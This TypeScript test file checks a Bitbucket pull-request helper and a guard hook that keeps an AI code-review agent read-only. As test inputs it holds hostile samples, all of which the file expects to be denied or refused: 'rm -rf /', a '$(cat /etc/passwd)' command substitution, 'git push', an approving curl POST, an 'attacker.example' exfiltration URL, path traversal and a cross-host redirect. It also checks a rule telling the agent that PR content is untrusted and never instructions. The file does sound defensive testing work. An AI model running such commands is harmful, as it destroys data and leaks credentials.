/**
 * bitbucket-pr.test.ts
 *
 * Pins /review-pr's read-only guarantee and its Bitbucket retrieval (0.8.0):
 *   - scripts/bitbucket-pr.ts against a local fake Bitbucket that FAILS on any method but GET:
 *     metadata, paginated diffstat and commits, the diff's 302 redirect, a capped diff,
 *     every error status, rate limiting without a retry loop, one retry on 5xx, a refused
 *     cross-host redirect, and a credential that never leaves the Authorization header;
 *   - the review-pr-guard hook: inside the pr-reviewer agent only reads, the helper and
 *     read-only MCP tools pass; everything else is denied; other agents are untouched;
 *   - the agent's tools and the command's frontmatter.
 *
 *   node --no-warnings scripts/bitbucket-pr.test.ts
 */

import { createServer, type IncomingMessage, type ServerResponse } from "http";
import { spawn, spawnSync, execFileSync } from "child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, writeFileSync, utimesSync } from "fs";
import { tmpdir } from "os";
import { join, dirname } from "path";
import * as BB from "./bitbucket-pr.ts";

const HERE = import.meta.dirname ?? __dirname;
const REPO_ROOT = dirname(HERE);
let failures = 0;
function check(name: string, cond: boolean, detail = ""): void {
  if (cond) console.log(`PASS  ${name}`);
  else {
    failures++;
    console.log(`FAIL  ${name}${detail ? `  — ${detail}` : ""}`);
  }
}
const read = (rel: string) => readFileSync(join(REPO_ROOT, rel), "utf-8");
const TMP = realpathSync(mkdtempSync(join(tmpdir(), "bitbucket-pr-")));
// A fake credential, assembled at run time so no secret-shaped literal sits in the source.
const CRED = ["fake", "bitbucket", "credential", "for", "tests", "0001"].join("-");
const PR = "https://bitbucket.org/onoapps/yes-tv/pull-requests/42";

/* ------------------------------------------------------------ fake Bitbucket */

const nonGet: string[] = [];
const authSeen: string[] = [];
let mode: Record<string, unknown> = {};
let hits: Record<string, number> = {};
const DIFF = (n: number) => Array.from({ length: n }, (_, i) => `diff --git a/src/f${i}.ts b/src/f${i}.ts\n--- a/src/f${i}.ts\n+++ b/src/f${i}.ts\n@@ -1 +1 @@\n-old\n+new ${"x".repeat(200)}\n`).join("");
const DESCRIPTION = `## Login\n\n### Ono references (v1)\n\n**Specification**\n- Detailed Design: [docs/login/login-DD.md](https://bitbucket.org/onoapps/yes-tv/src/${"a".repeat(40)}/docs/login/login-DD.md)\n**UI / design**\n- Figma: [Login](https://www.figma.com/design/AbC123/Login?node-id=42-7) — node \`42:7\`\n\n### Internal review\n- Fresh\n`;

function handler(req: IncomingMessage, res: ServerResponse, base: string): void {
  if (req.method !== "GET") {
    nonGet.push(`${req.method} ${req.url}`);
    res.writeHead(405).end();
    return;
  }
  authSeen.push(String(req.headers.authorization ?? ""));
  const url = new URL(req.url ?? "/", base);
  const p = url.pathname;
  hits[p] = (hits[p] ?? 0) + 1;
  const json = (o: unknown, status = 200) => res.writeHead(status, { "content-type": "application/json" }).end(JSON.stringify(o));
  const status = mode[p] as number | undefined;
  if (status === 429) return void res.writeHead(429, { "x-ratelimit-limit": "1000", "x-ratelimit-resource": "api", "retry-after": "60" }).end("Rate limit for this resource has been exceeded");
  if (status === 503 && hits[p] === 1) return void res.writeHead(503).end();
  if (status === 5032) return void res.writeHead(503).end();
  if (typeof status === "number" && status !== 503) return void res.writeHead(status).end("{}");
  const R = "/2.0/repositories/onoapps/yes-tv";
  if (p === `${R}/pullrequests/42`) return json({ id: 42, title: "Login with one-time code", state: "OPEN", author: { display_name: "Dana" }, description: DESCRIPTION, source: { branch: { name: "feature/login" }, commit: { hash: "a".repeat(40) } }, destination: { branch: { name: "develop" }, commit: { hash: "b".repeat(40) } } });
  if (p === `${R}/pullrequests/42/diffstat`) return void res.writeHead(302, { location: `${base}${R}/diffstat/${"a".repeat(12)}..${"b".repeat(12)}` }).end();
  if (p.startsWith(`${R}/diffstat/`)) {
    const page = Number(url.searchParams.get("page") ?? "1");
    const all = Array.from({ length: 6 }, (_, i) => ({ status: "modified", lines_added: 1, lines_removed: 1, new: { path: `src/f${i}.ts` }, old: { path: `src/f${i}.ts` } }));
    if (mode.endless) return json({ values: page === 1 ? all.slice(0, 3) : [], next: `${base}${p}?page=${page + 1}` });
    return json({ values: all.slice((page - 1) * 3, page * 3), ...(page === 1 ? { next: `${base}${p}?page=2` } : {}) });
  }
  if (p === `${R}/pullrequests/42/commits`) return json({ values: [{ hash: "c".repeat(40), message: "Add login\n\nbody" }] });
  if (p === `${R}/pullrequests/42/diff`) {
    if (mode.crossHost) return void res.writeHead(302, { location: "http://127.0.0.2:9/steal" }).end();
    return void res.writeHead(302, { location: `${base}${R}/diff/${"a".repeat(12)}..${"b".repeat(12)}` }).end();
  }
  if (p.startsWith(`${R}/diff/`)) return void res.writeHead(200, { "content-type": "text/plain" }).end(DIFF(6));
  if (p.startsWith(`${R}/src/`)) return void res.writeHead(200, { "content-type": "text/plain" }).end(`// ${p.slice(p.indexOf("/src/") + 5)}\nexport const x = 1;\n`);
  json({ error: "not found" }, 404);
}

async function withServer(fn: (env: NodeJS.ProcessEnv) => Promise<void>): Promise<void> {
  let base = "";
  const server = createServer((q, s) => handler(q, s, base));
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  const port = (server.address() as any).port;
  base = `http://127.0.0.1:${port}`;
  try {
    await fn({ ...process.env, BITBUCKET_API_BASE: `${base}/2.0`, BITBUCKET_API_TOKEN: CRED, BITBUCKET_EMAIL: "", TMPDIR: TMP });
  } finally {
    server.close();
  }
}

/* ------------------------------------------------------------------- hook */

const HOOK = join(REPO_ROOT, "hooks/review-pr-guard.sh");
const RUNNER_PATH = `${dirname(process.execPath)}:${process.env.PATH ?? ""}`;
function hook(payload: unknown, env: Record<string, string> = {}) {
  const p = spawnSync("bash", [HOOK], { input: JSON.stringify(payload), encoding: "utf-8", env: { ...process.env, PATH: RUNNER_PATH, CLAUDE_PLUGIN_ROOT: REPO_ROOT, ...env } });
  let j: any = null;
  try {
    j = p.stdout.trim() ? JSON.parse(p.stdout) : null;
  } catch {
    /* not JSON */
  }
  return { code: p.status, out: p.stdout, decision: j?.hookSpecificOutput?.permissionDecision ?? null };
}
const AGENT = "ono-mobile-dev-plugin:pr-reviewer";
const call = (tool: string, input: Record<string, unknown> = {}, agent: string | null = AGENT) => ({ tool_name: tool, tool_input: input, session_id: "s", cwd: TMP, ...(agent ? { agent_type: agent } : {}) });
const HELPER = `node --no-warnings "${REPO_ROOT}/scripts/bitbucket-pr.ts"`;

async function main(): Promise<void> {
  // 1. Retrieval, against the fake Bitbucket.
  await withServer(async (env) => {
    const r = await BB.fetchPr(PR, { env });
    check("fetch: metadata, diffstat, commits and diff retrieved", r.ok === true && r.outcome === "BB_PR_FETCHED" && r.pr.id === 42 && r.pr.source.branch === "feature/login" && r.pr.destination.branch === "develop", JSON.stringify(r).slice(0, 300));
    check("fetch: the diffstat's 302 is followed and both pages are read (next)", r.files?.length === 6 && r.diffstat_complete === true);
    check("fetch: the diff's 302 is followed", r.diff?.truncated === false && r.files.every((f: any) => f.diff_retrieved));
    check("fetch: commits listed with their first line", r.commits?.length === 1 && r.commits[0].message === "Add login");
    check("fetch: the Ono references section is read back — repository document and Figma node", r.ono_references?.found === true && r.ono_references.links.some((l: any) => l.kind === "bitbucket-src" && l.src.path === "docs/login/login-DD.md") && r.ono_references.links.some((l: any) => l.kind === "figma" && l.figma.node_id === "42:7"));
    check("fetch: staged under the OS temp directory, outside every repository", String(r.staging_dir).startsWith(TMP) && ["pr.json", "description.md", "diffstat.json", "diff.patch"].every((f) => existsSync(join(r.staging_dir, f))));
    check("auth: Bearer with the token alone", authSeen.length > 0 && authSeen.every((h) => h === `Bearer ${CRED}`));
    const staged = r.staging_dir ? readdirSync(r.staging_dir).map((f) => readFileSync(join(r.staging_dir, f), "utf-8")).join("\n") : "";
    check("secrets: the credential is in no output and no staged file", !JSON.stringify(r).includes(CRED) && !staged.includes(CRED));

    authSeen.length = 0;
    await BB.fetchPr(PR, { env: { ...env, BITBUCKET_EMAIL: "dana@onoapps.com" } });
    check("auth: Basic (email + token) when BITBUCKET_EMAIL is set", authSeen.length > 0 && authSeen.every((h) => h === `Basic ${Buffer.from(`dana@onoapps.com:${CRED}`).toString("base64")}`));

    const partial = await BB.fetchPr(PR, { env, maxDiffBytes: 700 });
    check("large diff: cut at a file boundary; later files reported as not retrieved", partial.outcome === "BB_PR_FETCHED_PARTIAL" && partial.diff.truncated === true && partial.files_not_retrieved.length >= 3 && partial.coverage === "incomplete" && partial.warnings.some((w: any) => w.code === "BB_DIFF_TOO_LARGE"), JSON.stringify(partial.files_not_retrieved));

    const file = await BB.fetchFile(PR, "src/f1.ts", { env });
    check("file: content at the PR's source commit", file.ok === true && file.commit === "a".repeat(40) && String(file.content).includes("src/f1.ts"));
    const dest = await BB.fetchFile(PR, "src/f1.ts", { env, side: "destination" });
    check("file: content at the destination commit", dest.commit === "b".repeat(40));
    const doc = await BB.fetchFile(PR, "docs/login/login-DD.md", { env, commit: "a".repeat(40) });
    check("file: a referenced document at its pinned commit", doc.ok === true && doc.side === "commit");
    check("file: a path escaping the repository is refused", (await BB.fetchFile(PR, "../etc/passwd", { env })).outcome === "BB_PATH_INVALID");

    // Errors.
    const R = "/2.0/repositories/onoapps/yes-tv/pullrequests/42";
    for (const [status, outcome] of [[401, "BB_UNAUTHORIZED"], [403, "BB_FORBIDDEN"], [404, "BB_NOT_FOUND"], [410, "BB_GONE"]] as const) {
      mode = { [R]: status };
      const e = await BB.fetchPr(PR, { env });
      check(`errors: ${status} → ${outcome}`, e.ok === false && e.outcome === outcome && !JSON.stringify(e).includes(CRED), JSON.stringify(e));
    }
    mode = { [R]: 429 };
    hits = {};
    const rl = await BB.fetchPr(PR, { env });
    check("rate limit: 429 stops at once, reporting the headers, with no retry", rl.outcome === "BB_RATE_LIMITED" && rl.rate_limit?.["x-ratelimit-limit"] === "1000" && rl.rate_limit?.["retry-after"] === "60" && hits[R] === 1, JSON.stringify(rl));
    mode = { [R]: 503 };
    hits = {};
    check("5xx: one retry, then success", (await BB.fetchPr(PR, { env })).ok === true && hits[R] === 2);
    mode = { [R]: 5032 };
    hits = {};
    const down = await BB.fetchPr(PR, { env });
    check("5xx twice: stop as unavailable (two requests, no loop)", down.outcome === "BB_UNAVAILABLE" && hits[R] === 2, JSON.stringify(down));
    // m3: a file list that never ends is bounded, reported incomplete, and the diff's other files still listed.
    mode = { endless: true };
    hits = {};
    const endless = await BB.fetchPr(PR, { env });
    const pages = Object.entries(hits).filter(([k]) => k.includes("/diffstat/")).reduce((n, [, v]) => n + v, 0);
    check("m3: pagination is bounded (20 pages)", pages === 20, String(pages));
    check("m3: an incomplete file list is never full coverage", endless.ok === true && endless.diffstat_complete === false && endless.coverage === "incomplete" && endless.outcome === "BB_PR_FETCHED_PARTIAL" && endless.warnings.some((w: any) => w.code === "BB_FILE_LIST_INCOMPLETE" && /more files may exist/.test(w.message)), JSON.stringify(endless.warnings));
    check("m3: files in the diff that the list did not name are still reported (listed: false)", endless.files.length === 6 && endless.files.filter((f: any) => f.listed === false).length === 3, JSON.stringify(endless.files.map((f: any) => [f.path, f.listed])));
    check("m3: a complete fetch reports complete coverage", r.coverage === "complete");

    // m4: cleanup deletes only what fetch staged.
    const cl = BB.cleanupStaging(r.staging_dir, env);
    check("m4: cleanup removes the review's staging directory", cl.ok === true && !existsSync(r.staging_dir), JSON.stringify(cl));
    const foreign = join(TMP, "ono-review-pr-foreign");
    mkdirSync(foreign);
    writeFileSync(join(foreign, "notes.txt"), "mine");
    check("m4: a directory holding anything else is refused and kept", BB.cleanupStaging(foreign, env).outcome === "BB_CLEANUP_REFUSED" && existsSync(join(foreign, "notes.txt")));
    check("m4: a directory outside the temp directory is refused", BB.cleanupStaging(REPO_ROOT, env).outcome === "BB_CLEANUP_REFUSED" && existsSync(join(REPO_ROOT, "scripts")));
    check("m4: an empty argument is refused", BB.cleanupStaging("", env).outcome === "BB_CLEANUP_REFUSED");
    const old = (await BB.fetchPr(PR, { env })).staging_dir;
    const ancient = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000);
    utimesSync(old, ancient, ancient);
    utimesSync(foreign, ancient, ancient);
    const next = await BB.fetchPr(PR, { env });
    check("m4: a staging directory abandoned over a day ago is pruned by the next fetch", !existsSync(old) && existsSync(next.staging_dir));
    check("m4: pruning never touches a directory it did not create", existsSync(join(foreign, "notes.txt")));
    BB.cleanupStaging(next.staging_dir, env);

    mode = { crossHost: true };
    const cross = await BB.fetchPr(PR, { env });
    check("redirect: to another host is refused — the credential is never sent there", cross.outcome === "BB_REDIRECT_REFUSED", JSON.stringify(cross));
    mode = {};

    // The CLI, as the agent runs it: stdout and stderr never carry the credential.
    const out = await new Promise<{ code: number | null; stdout: string; stderr: string }>((resolve) => {
      const c = spawn(process.execPath, ["--no-warnings", join(HERE, "bitbucket-pr.ts"), "fetch", PR], { env });
      let stdout = "", stderr = "";
      c.stdout.on("data", (d) => (stdout += d));
      c.stderr.on("data", (d) => (stderr += d));
      c.on("close", (code) => resolve({ code, stdout, stderr }));
    });
    let cliOk = false;
    try {
      cliOk = JSON.parse(out.stdout).ok === true;
    } catch {
      cliOk = false;
    }
    check("cli: exits 0 with one JSON object", out.code === 0 && cliOk, out.stderr);
    check("cli: the credential is in neither stdout nor stderr", !out.stdout.includes(CRED) && !out.stderr.includes(CRED));
  });
  check("GET only: the fake Bitbucket saw no other method, ever", nonGet.length === 0, nonGet.join(", "));

  // 2. Before any request.
  {
    const none = await BB.fetchPr(PR, { env: { ...process.env, BITBUCKET_API_TOKEN: "" } });
    check("auth missing: stop before any request, never asking for the token in chat", none.outcome === "BB_AUTH_MISSING" && /never paste a token into the chat/.test(none.reason));
    check("url: anything but a Bitbucket Cloud PR URL is refused", (await BB.fetchPr("https://github.com/o/r/pull/1", { env: { ...process.env, BITBUCKET_API_TOKEN: CRED } })).outcome === "BB_URL_INVALID");
    check("url: the PR URL parser", JSON.stringify(BB.parsePrUrl("https://bitbucket.org/onoapps/yes-tv/pull-requests/42/diff")) === JSON.stringify({ workspace: "onoapps", repo: "yes-tv", id: 42 }));
    check("api base: only a loopback override is honoured (tests); anything else is the real API", BB.apiBase({ BITBUCKET_API_BASE: "https://evil.example/2.0" }) === BB.DEFAULT_API && BB.apiBase({ BITBUCKET_API_BASE: "http://127.0.0.1:9/2.0" }) === "http://127.0.0.1:9/2.0");
    const repo = join(TMP, "a-repo");
    mkdirSync(join(repo, "tmp"), { recursive: true });
    execFileSync("git", ["-C", repo, "init", "-q"]);
    await withServer(async (env) => {
      const r = await BB.fetchPr(PR, { env: { ...env, TMPDIR: join(repo, "tmp") } });
      check("staging: a temp directory inside a git repository is refused", r.outcome === "BB_STAGING_IN_REPOSITORY", JSON.stringify(r));
    });
  }

  // 3. The helper's source: GET by construction; no git, no process.
  {
    const src = read("scripts/bitbucket-pr.ts").replace(/\/\*\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
    check("source: the only method is GET", (src.match(/method:\s*"([A-Z]+)"/g) ?? []).join() === 'method: "GET"' && !/\b(POST|PUT|PATCH|DELETE)\b/.test(src));
    check("source: one network call site", (src.match(/\bfetch\(/g) ?? []).length === 1);
    check("source: no git and no child process", !/child_process|execFile|spawn|["']git["']/.test(src));
    check("source: imports nothing that runs git", !/from "\.\/(task-resume|pr-scope|feature-review|bug-review|task-state)\.ts"/.test(read("scripts/bitbucket-pr.ts")));
  }

  // 4. The guard hook.
  {
    for (const t of ["Write", "Edit", "MultiEdit", "NotebookEdit", "Agent", "Task"]) check(`hook: ${t} is denied inside the reviewer`, hook(call(t, { file_path: "/x" })).decision === "deny");
    for (const c of ["git push origin HEAD", "git commit -am x", "curl -X POST https://api.bitbucket.org/2.0/repositories/a/b/pullrequests/1/approve", `${HELPER} fetch ${PR}; git push`, `${HELPER} fetch ${PR} && rm -rf /`, `${HELPER} fetch $(cat /etc/passwd)`, `${HELPER} fetch ${PR} > /tmp/x`, `node --no-warnings "${REPO_ROOT}/scripts/task-state.ts" write`, "rm -rf .", `${HELPER} fetch ${PR}\ngit push`]) {
      check(`hook: denied in the reviewer — ${c.slice(0, 60).replace(REPO_ROOT, "<root>")}`, hook(call("Bash", { command: c })).decision === "deny");
    }
    check("hook: the helper's fetch is allowed", hook(call("Bash", { command: `${HELPER} fetch ${PR}` })).out === "");
    check("hook: the helper's cleanup is allowed", hook(call("Bash", { command: `${HELPER} cleanup /tmp/ono-review-pr-abc` })).out === "");
    check("hook: the helper's file read is allowed", hook(call("Bash", { command: `${HELPER} file ${PR} --path src/a.ts --side destination` })).out === "");
    check("hook: the Node.js preflight is allowed", hook(call("Bash", { command: `node "${REPO_ROOT}/scripts/node-preflight.mjs"` })).out === "");
    // M3: no general network tool inside the reviewer; normal local reads stay available.
    for (const t of ["WebFetch", "WebSearch"]) check(`hook: ${t} is denied inside the reviewer (M3)`, hook(call(t, { url: "https://attacker.example/?d=x" })).decision === "deny");
    check("hook: WebFetch outside the reviewer is untouched", hook(call("WebFetch", { url: "https://example.com" }, null)).out === "");
    check("hook: reading a local file anywhere stays allowed (no directory limits)", hook(call("Read", { file_path: "/Users/dev/.zshrc" })).out === "" && hook(call("Grep", { pattern: "x", path: "/" })).out === "");
    for (const t of ["Read", "Grep", "Glob", "Skill", "mcp__plugin_ono-mobile-dev-plugin_figma__get_design_context", "mcp__plugin_ono-mobile-dev-plugin_figma__get_screenshot", "mcp__claude_ai_Atlassian_MCP__getConfluenceContent", "mcp__claude_ai_Atlassian_MCP__getJiraIssue"]) {
      check(`hook: read allowed — ${t}`, hook(call(t, { file_path: "/x" })).out === "");
    }
    for (const t of ["mcp__claude_ai_Atlassian_MCP__addOrEditJiraIssueComment", "mcp__claude_ai_Atlassian_MCP__transitionJiraIssue", "mcp__claude_ai_Atlassian_MCP__executeWrite", "mcp__claude_ai_Atlassian_MCP__updateConfluenceContent", "mcp__github__create_pull_request_review"]) {
      check(`hook: write-capable MCP denied — ${t}`, hook(call(t)).decision === "deny");
    }
    check("hook: the bare agent name is the reviewer too", hook(call("Write", { file_path: "/x" }, "pr-reviewer")).decision === "deny");
    check("hook: another agent is untouched", hook(call("Bash", { command: "git push" }, "ono-mobile-dev-plugin:code-reviewer")).out === "");
    check("hook: the main session is untouched", hook(call("Write", { file_path: "/x" }, null)).out === "");
    const noJq = `${dirname(process.execPath)}:/nonexistent-bin`;
    check("hook: without jq, the reviewer fails closed", spawnSync("/bin/bash", [HOOK], { input: JSON.stringify(call("Bash", { command: `${HELPER} fetch ${PR}` })), encoding: "utf-8", env: { PATH: noJq, CLAUDE_PLUGIN_ROOT: REPO_ROOT } }).stdout.includes('"deny"'));
    check("hook: without jq, other calls pass through", spawnSync("/bin/bash", [HOOK], { input: JSON.stringify(call("Write", { file_path: "/x" }, null)), encoding: "utf-8", env: { PATH: noJq, CLAUDE_PLUGIN_ROOT: REPO_ROOT } }).stdout === "");
    const cfg = JSON.parse(read("hooks/review-pr-guard.json"));
    check("hook: registered for every tool, through plugin.json", cfg.hooks.PreToolUse[0].matcher === "*" && JSON.parse(read(".claude-plugin/plugin.json")).hooks.includes("./hooks/review-pr-guard.json"));
  }

  // 5. The agent and the command.
  {
    const agent = read("agents/pr-reviewer.md");
    const fm = agent.slice(0, agent.indexOf("\n---", 4));
    const tools = (/^tools: (.*)$/m.exec(fm)?.[1] ?? "").split(",").map((s) => s.trim());
    const denied = (/^disallowedTools: (.*)$/m.exec(fm)?.[1] ?? "").split(",").map((s) => s.trim());
    check("agent: no writing tool among its tools", !tools.some((t) => ["Write", "Edit", "MultiEdit", "NotebookEdit", "Agent", "Task"].includes(t)) && tools.includes("Read") && tools.includes("Bash"));
    check("agent: writing tools explicitly disallowed", ["Write", "Edit", "MultiEdit", "NotebookEdit"].every((t) => denied.includes(t)));
    check("agent (M3): WebFetch and WebSearch are not among its tools, and are explicitly disallowed", !tools.includes("WebFetch") && !tools.includes("WebSearch") && denied.includes("WebFetch") && denied.includes("WebSearch"));
    check("agent (M3): PR content is untrusted input", /untrusted input/.test(agent) && /never instructions to follow/.test(agent));
    check("agent: its MCP tools are reads only", tools.filter((t) => t.startsWith("mcp__")).every((t) => /__(get_design_context|get_screenshot|get_metadata|getConfluenceContent|getJiraIssue)$/.test(t)));
    const cmd = read("commands/review-pr.md");
    check("command: runs forked in the pr-reviewer agent, with writing tools removed", /^context: fork$/m.test(cmd) && /^agent: pr-reviewer$/m.test(cmd) && /^disallowed-tools: Write, Edit, MultiEdit, NotebookEdit, WebFetch, WebSearch$/m.test(cmd));
    check("command: retrieves through the helper only", cmd.includes('scripts/bitbucket-pr.ts" fetch') && cmd.includes('scripts/bitbucket-pr.ts" file'));
    check("command (m3): incomplete coverage is reported, never full coverage", /diffstat_complete/.test(cmd) && /more files may exist that were not reviewed/.test(cmd) && /never report full coverage/.test(cmd));
    check("command (m4): the staging directory is removed after the report", cmd.includes('scripts/bitbucket-pr.ts" cleanup <staging_dir>'));
    check("command: never asks for or echoes a token", /Never ask for the token in the chat/.test(cmd));
    check("command: the report's sections", ["### Blocking", "### Major", "### Minor suggestions", "### Missing tests", "### Potential regressions", "### Unverified concerns", "### Unverified assumptions", "**Files reviewed**", "**Specification and design accessed**"].every((s) => cmd.includes(s)));
    check("command: never claims tests ran", cmd.includes("No tests were executed by this review.") && /Never say a test passed, failed or ran/.test(cmd));
    check("command: no claim about a design or spec that was not read", /Never claim the UI matches a design, or the code matches a specification, that was not read/.test(cmd));
    check("command: the decision is the human's", /Decision: yours/.test(cmd));
    check("the suite is registered", read("scripts/check.ts").includes('"bitbucket-pr"'));
  }
}

try {
  await main();
} finally {
  rmSync(TMP, { recursive: true, force: true });
}
console.log(failures === 0 ? "\nall bitbucket-pr checks passed" : `\n${failures} failure(s)`);
process.exit(failures === 0 ? 0 : 1);
